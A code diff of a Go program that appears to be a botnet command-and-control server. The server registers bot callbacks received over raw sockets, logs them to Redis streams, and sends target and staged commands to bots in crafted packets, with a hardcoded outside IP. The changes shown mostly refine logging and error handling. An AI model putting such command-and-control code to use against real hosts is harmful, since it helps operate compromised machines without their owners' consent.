@@ -23,6 +23,7 @@ var ctx = context.Background()
 // Glabal to store target info
 var targetIP string
 var targetcommand string
+var verbose bool
 
 // Host defines values for a callback from a bot
 type Host struct {
@@ -36,6 +37,7 @@ type Host struct {
 
 // Write host
 func writeLog(streamKey string, event string, message string) {
+	// Builds arguments for redis datastream
 	args := &redis.XAddArgs{
         Stream: streamKey,
         MaxLen: 500,
@@ -47,10 +49,13 @@ func writeLog(streamKey string, event string, message string) {
         },
     }
 
+	// Send to redis datastream 
 	_, err := rdb.XAdd(ctx, args).Result()
     if err != nil {
         log.Fatalf("XAdd failed: %v", err)
-    }
+    } else if verbose {
+		fmt.Println(streamKey + " " + event + " " + message)
+	}
 }
 
 // sendCommand takes
@@ -65,13 +70,13 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 		// Make a socket for sending
 		fd := socket.NewSocket()
 
-		// Create packet
-		// writeLog("Server", fmt.Sprintf("SRC MAC:", iface.HardwareAddr)
-		// writeLog("Server", fmt.Sprintf("DST MAC:", dstMAC)
-		// writeLog("Server", fmt.Sprintf("SRC IP:", myIP)
-		// writeLog("Server", fmt.Sprintf("DST IP:", client.RespIP)
+		// // Create packet
+		// writeLog("Server", "DEBUG", fmt.Sprintf("SRC MAC:", iface.HardwareAddr))
+		// writeLog("Server", "DEBUG", fmt.Sprintf("DST MAC:", dstMAC))
+		// writeLog("Server", "DEBUG", fmt.Sprintf("SRC IP:", myIP))
+		// writeLog("Server", "DEBUG", fmt.Sprintf("DST IP:", client.RespIP))
 		if targetcommand != "" {
-			writeLog("Server", "TRAFFIC", fmt.Sprintf("Sending target cmd", targetIP, targetcommand))
+			writeLog("Server", "TRAFFIC", fmt.Sprintf("Sending target cmd to [%s]: %s", targetIP, targetcommand))
 			packet := socket.CreatePacket(iface, myIP, client.RespIP, client.DstPort, client.SrcPort, dstMAC, socket.CreateTargetCommand(targetcommand, targetIP))
 			socket.SendPacket(fd, iface, socket.CreateAddrStruct(iface), packet)
 		} else {
@@ -80,7 +85,7 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 		}
 		// YEET
 		if stagedCmd != "" {
-			writeLog("Server", "TRAFFIC", fmt.Sprintf("Sent reponse to:", client.Hostname, "(", client.IP, ")"))
+			writeLog("Server", "TRAFFIC", fmt.Sprintf("Sent reponse to: %s (%s)", client.Hostname, client.IP))
 			// Close the socket
 			unix.Close(fd)
 		} else {
@@ -100,7 +105,7 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 	// Parse the values from the data
 	mac, err := net.ParseMAC(payload[2])
 	if err != nil {
-		writeLog("Server", "ERROR", fmt.Sprintf("ERROR PARSING MAC:", err))
+		writeLog("Server", "ERROR", fmt.Sprintf("ERROR PARSING MAC: %s", err.Error()))
 		return
 	}
 
@@ -117,7 +122,7 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 		DstPort:  dstport,
 	}
 
-	writeLog("Server", "TRAFFIC", fmt.Sprintf("Recieved From:", newHost.Hostname, "(", newHost.IP, ")"))
+	writeLog("Server", "TRAFFIC", fmt.Sprintf("Recieved From: %s (%s)", newHost.Hostname, newHost.IP))
 	writeLog("Client", "JOIN", newHost.IP.String())
 
 	// Write host to channel
@@ -139,17 +144,17 @@ func initializeRawSocketServer() {
 	writeLog("Server", "DEBUG", fmt.Sprintf("Created sockets"))
 
 	// Make channel buffer by 5
-	listen := make(chan Host, 5)
+	listen := make(chan Host, 10)
 
 	// Iface and myip for the sendcommand func to use
 	iface, myIP := socket.GetOutwardIface("157.245.141.117:80")
-	writeLog("Server", "DEBUG", fmt.Sprintf("Interface:", iface.Name))
+	writeLog("Server", "DEBUG", fmt.Sprintf("Interface: %s", iface.Name))
 
 	dstMAC, err := socket.GetRouterMAC()
 	if err != nil {
 		log.Fatal(err)
 	}
-	writeLog("Server", "DEBUG", fmt.Sprintf("DST MAC:", dstMAC.String()))
+	writeLog("Server", "DEBUG", fmt.Sprintf("DST MAC: %s", dstMAC.String()))
 
 	// Spawn routine to listen for responses
 	writeLog("Server", "DEBUG", "Starting go routine...")
@@ -161,16 +166,36 @@ func initializeRawSocketServer() {
 	// This needs to be on main thread
 	for {
 		// packet := socket.ServerReadPacket(readfd, vm)
-		packet := socket.ServerReadPacket(readfd, filterVM)
-		if packet != nil {
+		packet, err := socket.ServerReadPacket(readfd, filterVM)
+		if err != nil {
+			writeLog("Server", "ERROR", err.Error())
+		} else if packet != nil {
 			go serverProcessPacket(packet, listen)
 		}
 	}
 }
 
 func main() {
+	verbose = false
 	rdb = redis.NewClient(&redis.Options{ // Connect to local redis database
 		Addr: "localhost:6379",
-	})
-	initializeRawSocketServer()
+	})	
+	go initializeRawSocketServer()
+
+	for {
+		streams, err := rdb.XRead(ctx, &redis.XReadArgs{
+			Streams: []string{"Server", "$"},
+			Block:   0,
+			Count:   1,
+		}).Result()
+		if err != nil {
+			log.Fatalf("XRead failed: %v", err)
+		}
+
+		for _, stream := range streams {
+			for _, msg := range stream.Messages {
+				fmt.Printf("ID: %s, Values: %v\n", msg.ID, msg.Values)
+			}
+		}
+	}
 }
